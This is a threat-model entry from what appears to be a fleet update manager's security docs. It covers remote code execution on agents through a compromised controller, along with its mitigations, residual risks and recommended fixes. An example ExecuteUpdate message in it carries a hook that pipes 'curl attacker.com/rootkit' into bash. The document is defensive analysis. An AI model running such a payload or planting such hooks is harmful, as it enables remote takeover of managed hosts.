# ATK-17: RCE on Agents via Compromised Controller

| Field | Value |
| --- | --- |
| Severity | Critical |
| Attack surface | Controller / wire protocol |
| Prerequisites | Compromise of the controller or ability to inject `ControllerMessage` payloads |
| STRIDE | Elevation of Privilege |

## Attack description

1. The attacker compromises the controller through any means: direct access to the
   controller host, database access to modify settings, forged JWT with `owner`
   permissions (via [ATK-03](03-master-key-compromise.md)), or NATS message injection.
2. The attacker crafts an `ExecuteUpdate` message with malicious `pre_update_hooks`
   or `post_update_hooks`:

   ```json
   {
     "type": "execute_update",
     "host_machine_id": "<target_host>",
     "update_history_id": "<uuid>",
     "software_item_id": "<uuid>",
     "to_version": "1.0.0",
     "execute_update_plugin": { "plugin_type": "generic_shell", "config": {} },
     "pre_update_hooks": [
       {
         "type": "shell",
         "command": "curl attacker.com/rootkit | bash",
         "shell": "bash"
       }
     ]
   }
   ```

3. The controller sends this message to the target agent over the mTLS WebSocket.
4. The agent's `run_hook_command()` executes the shell command via
   `bash -c "set -euo pipefail\ncurl attacker.com/rootkit | bash"`.

The same attack applies via:

- **`ExecuteBatchHostPackageUpdate`** — carries the same `pre_update_hooks` and
  `post_update_hooks` fields.
- **`CheckVersions`** — does not carry hooks directly, but the `PluginAssignment`
  config JSON is passed to the plugin constructor. A malicious config for the
  `generic_shell` plugin type contains `version_command` which is executed as a
  shell command.
- **`DiscoverSoftware`** — similarly passes plugin config to the discovery plugin.

## Worst-case impact

- **Arbitrary code execution on every managed host.** The controller communicates with
  all enrolled agents. A compromised controller can send malicious payloads to every
  agent simultaneously.
- **Root-level compromise.** On hosts where the agent has sudo access, the attacker
  achieves root. The SSH agent extends this to remote hosts via SSH sessions.
- **Fleet-wide rootkit deployment.** The attacker uses the update pipeline to deploy
  persistent backdoors across the entire managed infrastructure in a single operation.
- **Undetectable compromise.** Since the agent trusts the controller by design, there
  are no application-level alerts when the controller sends unexpected commands. The
  agent logs the commands at `info` level but does not flag anomalies.

## Current mitigations

- **mTLS between controller and agents.** The WebSocket connection is authenticated
  with ECDSA P-256 client certificates. An attacker cannot inject messages without
  either compromising the controller or forging the controller's server certificate.
- **Sequence-number validation.** Every message carries a monotonically increasing
  `seq` field. An attacker who hijacks the WebSocket cannot replay old messages or
  inject messages with incorrect sequence numbers.
- **Protocol version gating.** Messages with an unexpected `protocol_version` cause
  immediate connection termination.
- **1 MB message size limit.** WebSocket messages exceeding 1 MB are rejected at the
  transport layer, limiting the size of injected payloads.
- **`host_machine_id` routing guard.** The agent validates that the
  `host_machine_id` matches its own. A compromised controller must know the target
  host's machine ID (easily obtained from the database).
- **Controller access protection.** The controller is protected by HTTPS, JWT
  authentication, RBAC permissions, and rate limiting. Multiple layers must be
  breached to reach the message injection point.

## Residual risk

- **Agents implicitly trust the controller.** By design, agents execute any command
  received from the authenticated controller. There is no mechanism for agents to
  independently verify command legitimacy, rate-limit command execution, or require
  operator confirmation.
- **No command signing.** `ExecuteUpdate` messages are not cryptographically signed
  by the originating admin user. The agent cannot distinguish between commands issued
  by a legitimate admin and commands injected by a compromised controller.
- **NATS message injection.** In HA deployments, `ControllerMessage` variants are
  published to NATS for cross-instance delivery. An attacker with NATS access can
  inject messages into the `uptrakit.events.controller` subject. While
  `ExecuteUpdate` is typically delivered directly via WebSocket (not NATS), other
  messages (e.g., `CaBundleUpdated`, `RequestCertRenewal`) are NATS-delivered and
  could be manipulated.
- **Single trust domain.** The controller is the single root of trust for all agents.
  There is no separation between "command plane" and "data plane" — the same entity
  that manages the software inventory also has full code execution authority.
- **No execution rate limiting on agents.** Agents do not rate-limit the number of
  `execute_update` or `execute_batch_host_package_update` messages they process. A
  compromised controller could flood agents with concurrent executions.

## Recommended improvements

- Implement cryptographic command signing where `ExecuteUpdate` messages include a
  signature from the originating admin user's credential, allowing agents to verify
  command provenance independently of the controller's TLS identity.
- Add agent-side execution rate limiting (e.g., maximum one concurrent update per
  software item) to prevent flood attacks from a compromised controller.
- Implement a "break glass" mechanism on agents that allows operators to freeze
  command execution from the agent side (e.g., a local flag file or signal that
  causes the agent to reject all `execute_update` messages).
- Add anomaly detection on agents for unusual command patterns (e.g., hooks that
  download and execute external scripts, commands targeting sensitive system files,
  or updates at unusual times).
- Consider implementing command logging with hash-chained integrity (an append-only
  log on the agent that records every command received from the controller), enabling
  forensic analysis after a suspected compromise.
- Document the controller as the critical trust anchor and provide hardening
  guidance: minimal network exposure, dedicated host, immutable infrastructure,
  integrity monitoring.

## References

- [Wire Protocol — Agent-specific messages](../api/wire-protocol.md#agent-specific-controller---service)
- [ATK-16: RCE via Plugin Config Manipulation](16-rce-plugin-config-manipulation.md)
- [ATK-03: Master Key Compromise](03-master-key-compromise.md)
- [Security Architecture](../security/security-architecture.md)
- `crates/shared/wire/src/lib.rs` — `ExecuteUpdatePayload`, `HookCommand`
- `crates/shared/agent-core/src/update.rs` — `run_hook_command()`
- `crates/shared/command/src/command.rs` — `run_command_with_shell()`
